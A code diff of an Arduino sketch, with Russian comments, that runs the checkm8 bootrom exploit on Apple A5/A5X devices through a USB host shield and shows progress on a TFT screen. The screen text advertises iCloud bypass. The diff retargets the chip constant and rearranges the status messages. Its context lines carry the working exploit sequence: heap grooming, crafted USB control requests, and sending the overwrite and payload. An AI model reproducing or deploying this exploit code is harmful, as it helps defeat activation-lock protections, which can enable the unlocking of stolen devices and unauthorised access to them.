@@ -16,7 +16,7 @@
 // Создаем объект дисплея
 MCUFRIEND_kbv tft;
 
-#define A5_8942
+#define A5_8940
 #include "constants.h"
 
 USB Usb;
@@ -65,7 +65,7 @@ void setup() {
     tft.setCursor(0, 0);
     // Выводим текст
     tft.println(); // Пустая строка
-    tft.println(" SmartMaster35Rus unlock ");
+    tft.println(" SmartMaster35Rus iPWNDFU ");
     tft.println(); // Пустая строка
     tft.println(" For bypass iCloud ");
     tft.println(" A5/A5X checkm8 ");
@@ -200,51 +200,28 @@ void heap_feng_shui()
 
 void set_global_state()
 {
-   // Инициализируем дисплей
-  uint16_t ID = tft.readID();
-  if (ID == 0x9488) 
-    tft.begin(ID);
-    tft.fillScreen(0xFF00); // Заполняем экран синим цветом
-    tft.setRotation(0); // Устанавливаем ориентацию экрана
-
-    // Устанавливаем цвет текста (Белый)
-    tft.setTextColor(0x000F);
-    // Устанавливаем размер текста
-    tft.setTextSize(2);
-    // Устанавливаем курсор в левый верхний угол
-    tft.setCursor(0, 0);
-    // Выводим текст
   Serial.println("2. set global state");
   uint8_t tmpbuf[0x40];
   memset(tmpbuf, 0xcc, sizeof(tmpbuf));
-  tft.println(); // Пустая строка
-  tft.println(" Run checkm8 exploit...START%! ");
   rcode = Usb.ctrlReq_SETUP(0, 0, 0x21, 1, 0, 0, 0, 0x40);
   //Usb.regWr(rHCTL, bmSNDTOG0);
   rcode = send_out(tmpbuf, 0x40);
   Serial.print("OUT pre-packet: "); Serial.println(rcode, HEX);
-  tft.println(" Run checkm8 exploit...20%! ");
   
   rcode = send_out(tmpbuf, 0x40);
   Serial.print("Send random 0x40 bytes: "); Serial.println(rcode, HEX);
-  tft.println(" Run checkm8 exploit...40%! ");
   
   rcode = Usb.dispatchPkt(tokINHS, 0, 0);
   Serial.print("Send random 0x40 bytes HS: "); Serial.println(rcode, HEX);
-  tft.println(" Run checkm8 exploit...60%! ");
   
   rcode = Usb.ctrlReq(0, 0, 0x21, 1, 0, 0, 0, 0, 0, 0, 0);
   Serial.print("Send zero length packet: "); Serial.println(rcode, HEX);
-  tft.println(" Run checkm8 exploit...80%! ");
   
   rcode = Usb.ctrlReq(0, 0, 0xA1, 3, 0, 0, 0, 6, 6, tmpbuf, 0);
   Serial.print("Send get status #1: "); Serial.println(rcode, HEX);
-  tft.println(" Run checkm8 exploit...100%! ");
   
   rcode = Usb.ctrlReq(0, 0, 0xA1, 3, 0, 0, 0, 6, 6, tmpbuf, 0);
   Serial.print("Send get status #2: "); Serial.println(rcode, HEX);
-  tft.println(" checkm8 done ");
-  tft.println(" Please connect sliver.app ");
   
   
   rcode = Usb.ctrlReq_SETUP(0, 0, 0x21, 1, 0, 0, 0, padding + 0x40);
@@ -294,27 +271,33 @@ void heap_occupation()
   Serial.println("overwrite sending ...");
   rcode = Usb.ctrlReq_SETUP(0, 0, 0, 0, 0, 0, 0, 0x40);
   Serial.print("    SETUP: "); Serial.println(rcode, HEX);
-  tft.println(" Run checkm8 exploit...START%! ");
+  tft.println(); // Пустая строка
+  tft.println("Checkm8 exploit...START%!");
+  tft.println(); // Пустая строка
   //Usb.regWr(rHCTL, bmSNDTOG0);
   memset(tmpbuf, 0xcc, sizeof(tmpbuf));
   rcode = send_out(tmpbuf, 0x40);
   Serial.print("    OUT (pre packet): "); Serial.println(rcode, HEX);
-    tft.println(" Run checkm8 exploit...20%! ");
+    tft.println("Run checkm8 exploit..20%!");
+    tft.println(); // Пустая строка
   for(int i = 0; i < 0x40; i++)
     tmpbuf[i] = pgm_read_byte(overwrite + i);
   rcode = send_out(tmpbuf, 0x40);
   Serial.print("    OUT: "); Serial.println(rcode, HEX);
-    tft.println(" Run checkm8 exploit...40%! ");
+    tft.println("Run checkm8 exploit..40%!");
+    tft.println(); // Пустая строка
 
   Serial.println("payload sending ...");
   rcode = Usb.ctrlReq_SETUP(0, 0, 0x21, 1, 0, 0, 0, sizeof(payload));
   Serial.print("    SETUP: "); Serial.println(rcode, HEX);
-    tft.println(" Run checkm8 exploit...60%! ");
+    tft.println("Run checkm8 exploit..60%!");
+    tft.println(); // Пустая строка
   //Usb.regWr(rHCTL, bmSNDTOG0);
   memset(tmpbuf, 0xcc, sizeof(tmpbuf));
   rcode = send_out(tmpbuf, 0x40);
   Serial.print("    OUT (pre packet): "); Serial.println(rcode, HEX);
-  tft.println(" Run checkm8 exploit...80%! ");
+  tft.println("Run checkm8 exploit..80%!");
+  tft.println(); // Пустая строка
 
   for(int i = 0; i < sizeof(payload); i += 0x40)
   {
@@ -323,10 +306,12 @@ void heap_occupation()
     rcode = send_out(tmpbuf, 0x40);
     Serial.print("    OUT: "); Serial.println(rcode, HEX);
   }
-    tft.println(" checkm8 exploit...100%! ");
-    tft.println(" checkm8 done ");
-    tft.println(" Please connect sliver.app ");
+    tft.println("checkm8 exploit..100%! ");
+    tft.println(); // Пустая строка
+    tft.println(" checkm8 iPWNDFU done ");
+    tft.println(); // Пустая строка
+    tft.println("Please send device Ramdisk");
+    tft.println(); // Пустая строка
     delay(15000);  // Приостановить выполнение на 15 секунд
     resetFunc();  // Попытаться перезагрузить устройство
 }
-
